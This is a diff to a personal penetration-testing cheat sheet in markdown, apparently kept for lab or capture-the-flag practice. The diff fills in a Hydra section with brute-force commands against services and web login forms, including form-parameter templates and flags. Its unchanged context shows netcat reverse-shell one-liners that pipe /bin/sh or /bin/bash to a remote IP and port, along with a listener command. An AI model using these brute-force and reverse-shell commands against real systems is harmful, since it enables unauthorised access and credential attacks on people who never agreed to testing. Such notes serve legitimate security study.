@@ -1,7 +1,7 @@
 - [Net Sec](#net-sec)
   - [passive](#passive)
   - [active](#active)
-    - [](#)
+    - [Hydra](#hydra)
   - [Shell](#shell)
     - [Priv Escalation](#priv-escalation)
       - [shared libraries](#shared-libraries)
@@ -59,12 +59,21 @@
 - searchsploit
   
 
-### 
-
-
+### Hydra
 - hydra -l username -P wordlist.txt server service
+- hydra -l username -P wordlist.txt service://server
 - -d = debug
-- -vv = verbpse
+- -v = verbose
+- -V = show attempts
+- -f = terminate if found
+- -t = number threads
+
+- web
+  - hydra -l USERNAME -P wordlist.xt server *request* **"/[inside_request]:username=^USER^&password=^PASS^:F=incorrect"** -v
+  - hydra -l USERNAME -P wordlist.xt server *request* **"/[request]:[body_request]"** -vV -f
+  - hydra -l USERNAME -P wordlist.xt server *request* **"/[request]:username=^USER^&password=^PASS^:F=incorrect"** -v
+
+    - Request: HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy
 
 ## Shell
 - Reverse:
@@ -72,8 +81,6 @@
     - nc <LOCAL-IP> <PORT> -e /bin/bash
     - mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
     rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LOCAL-IP> <PORT> >/tmp/f”
-
-
   - Ziel: nc -nlvp PORT
 
 ### Priv Escalation
